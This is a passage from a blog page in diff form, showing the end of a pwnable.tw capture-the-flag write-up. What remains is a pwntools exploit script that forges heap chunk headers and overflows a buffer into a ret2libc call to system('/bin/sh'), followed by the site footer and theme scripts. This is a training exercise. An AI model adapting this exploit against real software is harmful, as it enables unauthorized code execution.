+</span></span><span style="display:flex;"><span>        p<span style="color:#f92672">.</span>sendlineafter (<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;&lt;y/n&gt;: &#39;</span>, <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;y&#39;</span>)
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> cnt <span style="color:#f92672">&lt;</span> <span style="color:#ae81ff">11</span>:
+</span></span><span style="display:flex;"><span>            Input (p, <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;ndd&#39;</span>, <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;12&#39;</span>, <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;onepieceisreal&#39;</span>, <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;bullshit&#39;</span>)
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">else</span>:
+</span></span><span style="display:flex;"><span>            Input_after_10 (p, <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;12&#39;</span>, <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;abcd&#39;</span>)
+</span></span><span style="display:flex;"><span>        p<span style="color:#f92672">.</span>recvuntil (<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;We will review them as soon as we can</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#39;</span>)
+</span></span><span style="display:flex;"><span>        print (<span style="color:#e6db74">&#34;-----------------------------------------&#34;</span>, cnt, <span style="color:#e6db74">&#34;times -------------------------------------------------------------------------------&#34;</span>)
+</span></span><span style="display:flex;"><span>        cnt <span style="color:#f92672">+=</span> <span style="color:#ae81ff">1</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    p<span style="color:#f92672">.</span>sendlineafter (<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;&lt;y/n&gt;: &#39;</span>, <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;y&#39;</span>)
+</span></span><span style="display:flex;"><span>    Input (p, <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;ndd&#39;</span>, <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;12&#39;</span>, p32 (<span style="color:#ae81ff">0</span>) <span style="color:#f92672">+</span> p32 (<span style="color:#ae81ff">0x41</span>) <span style="color:#f92672">+</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;</span><span style="color:#ae81ff">\x00</span><span style="color:#e6db74">&#39;</span> <span style="color:#f92672">*</span> <span style="color:#ae81ff">56</span> <span style="color:#f92672">+</span> p32 (<span style="color:#ae81ff">0</span>) <span style="color:#f92672">+</span> p32 (<span style="color:#ae81ff">0x21</span>), <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;A&#39;</span> <span style="color:#f92672">*</span> <span style="color:#ae81ff">0x50</span> <span style="color:#f92672">+</span> p32 (<span style="color:#ae81ff">12</span>) <span style="color:#f92672">+</span> p32 (ebp <span style="color:#f92672">-</span> <span style="color:#ae81ff">0x50</span> <span style="color:#f92672">+</span> <span style="color:#ae81ff">0x8</span>))
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    p<span style="color:#f92672">.</span>sendlineafter (<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;&lt;y/n&gt;: &#39;</span>, <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;y&#39;</span>)
+</span></span><span style="display:flex;"><span>    payload <span style="color:#f92672">=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;A&#39;</span> <span style="color:#f92672">*</span> (<span style="color:#ae81ff">0x50</span> <span style="color:#f92672">-</span> <span style="color:#ae81ff">0x8</span> <span style="color:#f92672">+</span> <span style="color:#ae81ff">0x4</span>) <span style="color:#f92672">+</span> p32 (libc<span style="color:#f92672">.</span>symbols[<span style="color:#e6db74">&#39;system&#39;</span>]) <span style="color:#f92672">+</span> p32(<span style="color:#ae81ff">0</span>) <span style="color:#f92672">+</span> p32 (next (libc<span style="color:#f92672">.</span>search (<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;/bin/sh&#39;</span>)))
+</span></span><span style="display:flex;"><span>    Input (p, payload, <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;12&#39;</span>, <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;A&#39;</span>, <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;A&#39;</span>)    
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    p<span style="color:#f92672">.</span>sendlineafter (<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;&lt;y/n&gt;: &#39;</span>, <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;n&#39;</span>)
+</span></span><span style="display:flex;"><span>    p<span style="color:#f92672">.</span>interactive()
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">if</span> __name__ <span style="color:#f92672">==</span> <span style="color:#e6db74">&#34;__main__&#34;</span>:
+</span></span><span style="display:flex;"><span>    main()
+</span></span></code></pre></div>
+
+  </div>
+
+  <footer class="post-footer">
+    <ul class="post-tags">
+      <li><a href="//localhost:1313/tags/pwnable.tw/">Pwnable.tw</a></li>
+    </ul>
+<nav class="paginav">
+  <a class="next" href="//localhost:1313/blogs/seethefile/">
+    <span class="title">Next »</span>
+    <br>
+    <span>Seethefile (250 pts) - pwnable.tw</span>
+  </a>
+</nav>
+
+  </footer>
+</article>
+    </main>
+    
+<footer class="footer">
+        <span>&copy; 2025 <a href="//localhost:1313/">NguyenDD&#39;s Blog</a></span> · 
+
+    <span>
+        Powered by
+        <a href="https://gohugo.io/" rel="noopener noreferrer" target="_blank">Hugo</a> &
+        <a href="https://github.com/adityatelange/hugo-PaperMod/" rel="noopener" target="_blank">PaperMod</a>
+    </span>
+</footer>
+<a href="#top" aria-label="go to top" title="Go to Top (Alt + G)" class="top-link" id="top-link" accesskey="g">
+    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 12 6" fill="currentColor">
+        <path d="M12 6H0l6-6z" />
+    </svg>
+</a>
+
+<script>
+    let menu = document.getElementById('menu')
+    if (menu) {
+        menu.scrollLeft = localStorage.getItem("menu-scroll-position");
+        menu.onscroll = function () {
+            localStorage.setItem("menu-scroll-position", menu.scrollLeft);
+        }
+    }
+
+    document.querySelectorAll('a[href^="#"]').forEach(anchor => {
+        anchor.addEventListener("click", function (e) {
+            e.preventDefault();
+            var id = this.getAttribute("href").substr(1);
+            if (!window.matchMedia('(prefers-reduced-motion: reduce)').matches) {
+                document.querySelector(`[id='${decodeURIComponent(id)}']`).scrollIntoView({
+                    behavior: "smooth"
+                });
+            } else {
+                document.querySelector(`[id='${decodeURIComponent(id)}']`).scrollIntoView();
+            }
+            if (id === "top") {
+                history.replaceState(null, null, " ");
+            } else {
+                history.pushState(null, null, `#${id}`);
+            }
+        });
+    });
+
+</script>
+<script>
+    var mybutton = document.getElementById("top-link");
+    window.onscroll = function () {
+        if (document.body.scrollTop > 800 || document.documentElement.scrollTop > 800) {
+            mybutton.style.visibility = "visible";
+            mybutton.style.opacity = "1";
+        } else {
+            mybutton.style.visibility = "hidden";
+            mybutton.style.opacity = "0";
+        }
+    };
+
+</script>
+<script>
+    document.getElementById("theme-toggle").addEventListener("click", () => {
+        if (document.body.className.includes("dark")) {
+            document.body.classList.remove('dark');
+            localStorage.setItem("pref-theme", 'light');
+        } else {
+            document.body.classList.add('dark');
+            localStorage.setItem("pref-theme", 'dark');
+        }
+    })
+
+</script>
+</body>
+
+</html>
